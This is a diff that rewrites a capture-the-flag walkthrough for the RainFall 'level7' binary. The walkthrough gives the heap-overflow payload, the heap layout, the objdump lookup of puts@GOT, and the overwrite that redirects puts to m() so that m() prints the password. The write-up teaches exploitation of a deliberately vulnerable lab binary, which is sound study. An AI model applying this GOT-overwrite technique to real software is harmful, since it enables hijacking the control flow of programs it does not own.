@@ -1,21 +1,36 @@
-================================== Level7 Walkthrough ============================================
+================================== Level 7 Walkthrough ==================================
 
-$(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+Payload:
 
+$(python -c 'print "A"*20 + "\x28\x99\x04\x08"') \
+$(python -c 'print "\xf4\x84\x04\x08"')
 
-[a[1] buffer 8b][b header 8b][b[0] 4b][b[1] 4b]
-  AAAAAAAA        AAAAAAAA     AAAA     puts@GOT
-←────────── 20 A's ──────────────────→ ←address→
+Heap layout crossed by strcpy(argv[1]):
 
-we used this command to find the address of puts@GOT:
------------------------------------------------------
-level7@RainFall:~$ objdump -R ./level7 | grep puts  |
-08049928 R_386_JUMP_SLOT   puts                     |
------------------------------------------------------
+[a[1] buffer 8B][malloc metadata 8B][b[0] 4B][b[1] 4B]
+  AAAAAAAA         AAAAAAAA        AAAA     puts@GOT
+←────────────── 20-byte overflow ──────────────→
 
-then argv[2] = m() address
-→ strcpy(puts@GOT, m())
-→ puts@GOT = m() ✅
+After the first strcpy:
+
+b[1] = puts@GOT
+
+We find puts@GOT with:
+
+level7@RainFall:~$ objdump -R ./level7 | grep puts
+08049928 R_386_JUMP_SLOT   puts
+
+The second argument is the address of m():
+
+argv[2] = m()
+
+So the second strcpy becomes:
+
+strcpy(puts@GOT, &m)
+
+Result:
+
+puts@GOT = m
 
 Later the program executes:
 
@@ -23,12 +38,14 @@ puts("~~");
 
 Normally:
 
-puts@GOT -> real puts
+puts@GOT ───► puts()
 
-But now:
+After the overwrite:
 
-puts@GOT -> m
+puts@GOT ───► m()
 
-so execution becomes:
+Therefore the call becomes:
 
 m();
+
+m() prints the password that was previously loaded into the global buffer.
